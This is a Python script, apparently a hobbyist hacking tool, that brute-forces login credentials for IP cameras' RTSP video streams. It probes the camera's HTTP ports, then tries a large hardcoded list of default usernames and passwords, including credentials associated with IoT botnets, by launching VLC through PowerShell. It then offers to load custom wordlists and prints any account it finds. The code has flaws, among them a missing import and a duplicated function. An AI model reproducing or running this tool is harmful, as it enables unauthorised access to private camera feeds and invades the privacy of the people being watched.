import subprocess
import requests
from time import sleep

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def gradient_text(text, start_color, end_color):
    def hex_to_rgb(hex_color):
        hex_color = hex_color.lstrip('#')
        return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))

    start_rgb = hex_to_rgb(start_color)
    end_rgb = hex_to_rgb(end_color)

    def interpolate_color(start_rgb, end_rgb, factor):
        return tuple(int(start_rgb[i] + (end_rgb[i] - start_rgb[i]) * factor) for i in range(3))

    length = len(text)
    gradient_text = ''

    for i, char in enumerate(text):
        factor = i / (length - 1)
        color = interpolate_color(start_rgb, end_rgb, factor)
        gradient_text += f'[38;2;{color[0]};{color[1]};{color[2]}m{char}'

    gradient_text += '[0m'  # сброс цвета
    return gradient_text

def check_rtsp_connection(ip, port, username, password):
    rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/"
    powershell_command = f'Start-Process vlc -ArgumentList "--intf", "dummy", "--run-time=10", "--play-and-exit", "{rtsp_url}"'

    command = [
        "powershell",
        "-Command",
        powershell_command
    ]

    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=20)
        stderr_output = result.stderr
        stdout_output = result.stdout

        if b"401 Unauthorized" in stderr_output:
            return False, "Unauthorized"  # Неверные учетные данные
        elif b"Error" in stderr_output:
            return False, "Error"  # Ошибка подключения
        elif stdout_output:
            return True, stderr_output.decode('utf-8', errors='replace')  # Успешное подключение
        else:
            return False, "Unknown Error"
    except subprocess.TimeoutExpired:
        return False, "Timeout"  # Таймаут подключения
    except Exception as e:
        return False, str(e)  # Другие исключения

def load_credentials(usernames_file, passwords_file):
    with open(usernames_file, 'r', encoding='utf-8', errors='ignore') as uf, open(passwords_file, 'r', encoding='utf-8', errors='ignore') as pf:
        usernames = [line.strip() for line in uf.readlines()]
        passwords = [line.strip() for line in pf.readlines()]
    return usernames, passwords


def check_http_connection(ip):
    http_urls = [
        f"http://{ip}:80",
        f"http://{ip}:443",
        f"http://{ip}:8080",
        f"http://{ip}:8000",
        f"http://{ip}:8888",
        f"http://{ip}:10001"
    ]
    headers = {'User-Agent': 'Mozilla/5.0'}
    for url in http_urls:
        try:
            response = requests.get(url, headers=headers, timeout=2)
            if response.status_code == 200:
                print(gradient_text(f"HTTP Adress: {url}", "#00FF00", "#32CD32"))  # Зеленый
                return True
        except requests.exceptions.RequestException:
            continue
    return False


def load_credentials(usernames_file, passwords_file):
    with open(usernames_file, 'r') as uf, open(passwords_file, 'r') as pf:
        usernames = [line.strip() for line in uf.readlines()]
        passwords = [line.strip() for line in pf.readlines()]
    return usernames, passwords


# Логотип с градиентом
logo = """
    ██▀███  ▄▄▄█████▓  ██████  ██▓███      ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████
    ▓██ ▒ ██▒▓  ██▒ ▓▒▒██    ▒ ▓██░  ██▒   ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀
    ▓██ ░▄█ ▒▒ ▓██░ ▒░░ ▓██▄   ▓██░ ██▓▒     ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███
    ▒██▀▀█▄  ░ ▓██▓ ░   ▒   ██▒▒██▄█▓▒ ▒   ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄
    ░██▓ ▒██▒  ▒██▒ ░ ▒██████▒▒▒██▒ ░  ░   ░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒
    ░ ▒▓ ░▒▓░  ▒ ░░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░   ░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░
    ░▒ ░ ▒░    ░    ░ ░▒  ░ ░░▒ ░        ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░
    ░░   ░   ░      ░  ░  ░  ░░           ░    ░   ░░   ░  ░░░ ░ ░   ░         ░ 
    ░                    ░               ░         ░        ░                 ░  ░ 
                        HAS NO BRUTEFORCE PASSWORD | WAIT TO ALPHA!
                            !!!YOU NEED VLC IN SYSTEM PATH!!!
    """

if __name__ == "__main__":
    clear_console()
    print(gradient_text(logo, "#1000FF", "#FFFFFF"))  # Сине-белый градиент

    ip = input("Camera IP: ")
    port = input("Port (Default 554): ") or "554"
    ports = [int(port)]

    # Дефолтные логины и пароли
    usernames = [
        "admin",
        "camera",
        "root",
        "sync",
        "sys",
        "supervisor",
        "nobody",
        "service",
        "default",
        "bin",
        "daemon",
        "defaul",
        "ftp",
        "ubnt",
        "admin1",
        "administrator",
        "666666",
        "888888",
        "Admin",
        "Administrator",
        "Dinion"
    ]

    passwords = [
        "camera",
        "pass",
        "password",
        "admin",
        "Admin",
        "default",
        "realtek",
        "root",
        "service",
        "ubnt",
        "unknown",
        "user",
        "supervisor",
        "support",
        "system",
        "tech",
        "smcadmin",
        "dreambox",
        "anko",
        "ccadmin",
        "cxlinux",
        "fliradmin",
        "00000000",
        "1111",
        "111111",
        "1111111",
        "123",
        "1234",
        "12345",
        "123456",
        "54321",
        "4321",
        "666666",
        "888888",
        "9999",
        "1234qwer",
        "cat1029",
        "IPCam@sw",
        "anni2013",
        "annie2012",
        "2601hx",
        "059AnkJ",
        "4uvdzKqBkj.jg",
        "7ujMko0admin",
        "7ujMko0vizxv",
        "OxhlwSG8",
        "S2fGqNFs",
        "Zte521",
        "/*6.=_ja",
        "avtech97",
        "fxjvt1805",
        "hdipc%No",
        "hi3518",
        "hichiphx",
        "hipc3518",
        "hkipc2016",
        "hslwificam",
        "ikwb",
        "ikwd",
        "ipc71a",
        "ivdev",
        "juantech",
        "jvbzd",
        "jvc",
        "jvtsmart123",
        "klv123",
        "klv1234",
        "meinsm",
        "tlJwpbo6",
        "vhd1206",
        "vizxv",
        "wbox123",
        "xc3511",
        "xmhdipc",
        "zlxx.",
        "laohuqian",
        "fxsdk+",
        "HI2105CHIP"
    ]

    # Проверка доступности HTTP интерфейса
    http_accessible = check_http_connection(ip)
    if not http_accessible:
        print(gradient_text(f"HTTP Closed {ip} Maybe camera OFFED", "#FF0000",
                            "#FF4500"))  # Красный

    # Продолжение проверки RTSP подключения
    credentials_found = False
    first_attempt = None
    second_attempt = None

    for port in ports:
        for username in usernames:
            for password in passwords:
                print(f"Проверка {username}:{password}")
                success, message = check_rtsp_connection(ip, port, username, password)
                if success:
                    if not first_attempt:
                        first_attempt = (username, password)
                    elif first_attempt == (username, password):
                        second_attempt = (username, password)

                    if first_attempt and second_attempt and first_attempt == second_attempt:
                        print(gradient_text(
                            f"FOUNDED ACCOUNT! IP: {ip}, Port: {port}, Username: {username}, Password: {password}",
                            "#00FF00", "#32CD32"))  # Зеленый
                    else:
                        print(gradient_text(
                            f"FOUNDED ACCOUNT! (may incorrect): IP: {ip}, Port: {port}, Username: {username}, Password: {password}",
                            "#FFFF00", "#FFF000"))  # Желтый
                    credentials_found = True
                    break
                else:
                    if message == "Unauthorized":
                        print(gradient_text("Closed Access", "#FFFF00", "#FFF000"))  # Желтый градиент
                    elif message == "Timeout":
                        print(gradient_text("Timeout", "#FFFF00", "#FFF000"))  # Желтый градиент
                    else:
                        print(gradient_text(f"Error when join: {message}", "#FF0000", "#FF4500"))  # Красный градиент
            if credentials_found:
                break
            if credentials_found:
                break
            sleep(1)  # Добавляем задержку между попытками подключения, чтобы избежать слишком частых попыток

            # Если дефолтные учетные данные не подошли или не были стабильны, спрашиваем путь к файлам с логинами и паролями
            if not credentials_found or (first_attempt and second_attempt and first_attempt != second_attempt):
                use_db = input("Use your DATABASE? (Y/N): ")
                if use_db.strip().lower() == 'y':
                    usernames_file = input("Enter username path: ")
                    passwords_file = input("Enter login path: ")
                    other_usernames, other_passwords = load_credentials(usernames_file, passwords_file)

                    for port in ports:
                        for username in other_usernames:
                            for password in other_passwords:
                                success, message = check_rtsp_connection(ip, port, username, password)
                                if success:
                                    print(gradient_text(
                                        f"FOUNDED ACCOUNT! IP: {ip}, Port: {port}, Username: {username}, Password: {password}",
                                        "#00FF00", "#32CD32"))  # Зеленый
                                    credentials_found = True
                                    break
                                else:
                                    if message == "Unauthorized":
                                        print(gradient_text("Error access", "#FFFF00",
                                                            "#FFF000"))  # Желтый градиент
                                    elif message == "Timeout":
                                        print(gradient_text("Timeout", "#FFFF00",
                                                            "#FFF000"))  # Желтый градиент
                                    else:
                                        print(gradient_text(f"Error when join: {message}", "#FF0000",
                                                            "#FF4500"))  # Красный градиент
                            if credentials_found:
                                break
                        if credentials_found:
                            break
                        sleep(1)

                    # Пауза перед завершением
                input("Enter to exit")
